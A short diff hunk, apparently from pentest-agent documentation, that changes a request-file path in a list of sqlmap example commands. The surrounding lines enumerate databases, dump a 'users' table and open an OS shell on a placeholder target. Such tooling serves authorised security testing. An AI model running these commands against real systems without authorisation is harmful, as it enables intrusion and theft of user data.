@@ -92,7 +92,7 @@ run_tool sqlmap -u "http://target/login" --data="user=a&pass=b" --batch --dbs
 # Default current-engagement auth should come from auth.json; only pass --cookie or headers explicitly for override tests.
 run_tool sqlmap -u "http://target/page?id=1" --batch -D dbname --tables
 run_tool sqlmap -u "http://target/page?id=1" --batch -D dbname -T users --dump
-run_tool sqlmap -r /engagement/scans/request.txt --batch --dbs --level 3 --risk 2
+run_tool sqlmap -r $DIR/scans/request.txt --batch --dbs --level 3 --risk 2
 run_tool sqlmap -u "http://target/page?id=1" --os-shell --batch
 ```
 
